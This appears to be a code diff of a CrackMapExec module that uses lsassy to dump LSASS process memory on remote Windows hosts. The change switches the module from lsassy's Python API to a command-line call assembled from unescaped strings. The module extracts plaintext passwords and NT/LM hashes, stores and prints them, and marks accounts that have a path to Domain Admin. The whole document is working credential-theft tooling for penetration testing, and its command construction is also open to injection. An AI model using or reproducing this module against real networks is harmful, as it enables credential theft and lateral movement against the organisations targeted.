@@ -8,8 +8,6 @@ import json
 import subprocess
 import sys
 
-from lsassy import Lsassy, Logger, Dumper, Parser, Writer
-
 
 class CMEModule:
     name = 'lsassy'
@@ -92,43 +90,47 @@ class CMEModule:
 
         host = connection.host
 
-        log_options = Logger.Options()
-        dump_options = Dumper.Options()
-        parse_options = Parser.Options()
-        write_option = Writer.Options(format="json", quiet=True)
+        command = r"lsassy --format json -d '{}' -u '{}' -p '{}' -H '{}:{}' {}".format(
+            domain_name, username, password, lmhash, nthash, host
+        )
+
+        if context.verbose:
+            command += " -vv "
 
         if self.method:
-            dump_options.method = int(self.method)
+            command += " --method {}".format(self.method)
 
         if self.remote_lsass_dump:
-            dump_options.dumpname = self.remote_lsass_dump
+            command += " --dumpname {}".format(self.remote_lsass_dump)
 
         if self.procdump_path:
-            dump_options.procdump_path = self.procdump_path
+            command += " --procdump {}".format(self.procdump_path)
 
         if self.dumpert_path:
-            dump_options.dumpert_path = self.dumpert_path
+            command += " --dumpert {}".format(self.dumpert_path)
 
-        lsassy = Lsassy(
-            hostname=host,
-            username=username,
-            domain=domain_name,
-            password=password,
-            lmhash=lmhash,
-            nthash=nthash,
-            log_options=log_options,
-            dump_options=dump_options,
-            parse_options=parse_options,
-            write_options=write_option
-        )
-        credentials = lsassy.get_credentials()
+        # Parsing lsass dump remotely
+        context.log.info('Parsing lsass with lsassy')
+        context.log.debug('Lsassy command : {}'.format(command))
+        code, out, err = self.run(command)
 
-        if not credentials['success']:
-            context.log.error(credentials['error_msg'])
-            if context.verbose and credentials['error_exception']:
-                context.log.error(credentials['error_exception'])
-        else:
-            self.process_credentials(context, connection, credentials["credentials"])
+        context.log.debug('----- lsassy output -----')
+        for line in out.split("\n"):
+            context.log.debug('{}'.format(line))
+        context.log.debug('-----   end output  -----')
+
+        if code != 0:
+            # Debug output
+            if code == 5:
+                context.log.error('Lsass is protected')
+            else:
+                context.log.error('Error while executing lsassy, try using CrackMapExec with --verbose to get more details')
+            context.log.debug('----- lsassy error [{}] -----'.format(code))
+            for line in err.split("\n"):
+                context.log.debug('{}'.format(line))
+            context.log.debug('-----   end error  -----')
+        elif not context.verbose:
+            self.process_credentials(context, connection, out)
 
     @staticmethod
     def run(cmd):
@@ -142,16 +144,15 @@ class CMEModule:
         return proc.returncode, stdout, stderr
 
     def process_credentials(self, context, connection, credentials):
-        for domain, creds in json.loads(credentials).items():
-            for username, passwords in creds.items():
-                for password in passwords:
-                    plain = password["password"]
-                    lmhash = password["lmhash"]
-                    nthash = password["nthash"]
-                    self.save_credentials(context, connection, domain, username, plain, lmhash, nthash)
-                    self.print_credentials(context, connection, domain, username, plain, lmhash, nthash)
-
-
+        credentials = json.loads(credentials)
+        for domain, users in credentials.items():
+            for username, creds in users.items():
+                for cred in creds:
+                    password = cred['password']
+                    lmhash = cred['lmhash']
+                    nthash = cred['nthash']
+                    self.save_credentials(context, connection, domain, username, password, lmhash, nthash)
+                    self.print_credentials(context, connection, domain, username, password, lmhash, nthash)
 
     @staticmethod
     def save_credentials(context, connection, domain, username, password, lmhash, nthash):
@@ -166,7 +167,7 @@ class CMEModule:
     def print_credentials(self, context, connection, domain, username, password, lmhash, nthash):
         if password is None:
             password = ':'.join(h for h in [lmhash, nthash] if h is not None)
-        output = "%s\\%s %s" % (domain, username, password)
+        output = "%s\\%s %s" % (domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8'))
         if self.bloodhound and self.bloodhound_analysis(context, connection, username):
             output += " [{}PATH TO DA{}]".format('\033[91m', '\033[93m') # Red and back to yellow
         context.log.highlight(output)
